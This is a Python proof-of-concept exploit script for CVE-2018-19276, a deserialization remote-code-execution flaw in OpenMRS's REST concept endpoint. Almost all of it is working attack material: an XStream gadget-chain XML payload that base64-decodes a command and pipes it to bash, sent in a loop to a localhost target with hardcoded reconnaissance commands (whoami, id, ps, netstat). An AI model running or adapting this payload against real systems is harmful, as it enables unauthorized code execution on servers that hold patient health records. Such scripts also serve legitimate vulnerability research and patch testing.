#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# py2
from __future__ import print_function

import base64
import requests
import sys
import re

# for java8
remote = "http://127.0.0.1:8888/"
ressource = "/openmrs/ws/rest/v1/concept"

proxy = {
}

if __name__ == "__main__":
    print("\nCVE-2018-19276 - OpenMRS Insecure Object Deserialization RCE\n")
    print ("[+] Checking if ressource available =>", end = " " )

    burp0_url = remote + ressource
    burp0_headers = {"Content-Type": "application/xml"}
    r = requests.post(burp0_url, headers=burp0_headers, proxies=proxy, verify=False, allow_redirects=False)
    if r.status_code == 500:
        print("\033[92mOK\033[0m")
    else:
        print("KO, ressource doesn't exist")
        sys.exit()

    while True:
        try:
            # command = input("command (\033[92mnot reflected\033[0m)> ")
            command="whoami;pwd;id;ps -ef;netstat -ant"
            if command == "exit":
                print("Exiting...")
                break
            
            command = base64.b64encode(command.encode('utf-8'))
            command_str = command.decode('utf-8')
            command_str = command_str.replace('/', '+')

            print("[+] Executing command =>", end=' ')
            burp0_url = "http://127.0.0.1:8888/openmrs/ws/rest/v1/concept"
            burp0_headers = {"Content-Type": "text/xml"}
            burp0_data = """<map>
<entry>
    <jdk.nashorn.internal.objects.NativeString>
        <flags>0</flags>
        <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <is class="javax.crypto.CipherInputStream">
                        <cipher class="javax.crypto.NullCipher">
                            <initialized>false</initialized>
                            <opmode>0</opmode>
                            <serviceIterator class="javax.imageio.spi.FilterIterator">
                                <iter class="javax.imageio.spi.FilterIterator">
                                    <iter class="java.util.Collections$EmptyIterator"/>
                                    <next class="java.lang.ProcessBuilder">
                                        <command>
                                            <string>/bin/bash</string>
                                            <string>-c</string>
                                            <string>{echo,%s}|{base64,-d}|{bash,-i}</string>
                                        </command>
                                        <redirectErrorStream>false</redirectErrorStream>
                                    </next>
                                </iter>
                                <filter class="javax.imageio.ImageIO$ContainsFilter">
                                    <method>
                                        <class>java.lang.ProcessBuilder</class>
                                        <name>start</name>
                                        <parameter-types/>
                                    </method>
                                    <name>foo</name>
                                </filter>
                                <next class="string">foo</next>
                            </serviceIterator>
                            <lock/>
                        </cipher>
                        <input class="java.lang.ProcessBuilder$NullInputStream"/>
                        <ibuffer></ibuffer>
                        <done>false</done>
                        <ostart>0</ostart>
                        <ofinish>0</ofinish>
                        <closed>false</closed>
                    </is>
                    <consumed>false</consumed>
                </dataSource>
                <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
        </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
</entry>
<entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>""" % command_str
            print(burp0_data)
            r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy,verify=False, allow_redirects=False)
            if r.status_code == 500:
                m = re.search(
                    '(java.util.HashMap)', r.text)
                if m:
                    print("\033[92mOK\033[0m")
                else:
                    print("KO")

        except KeyboardInterrupt:
            print("Exiting...")
            break
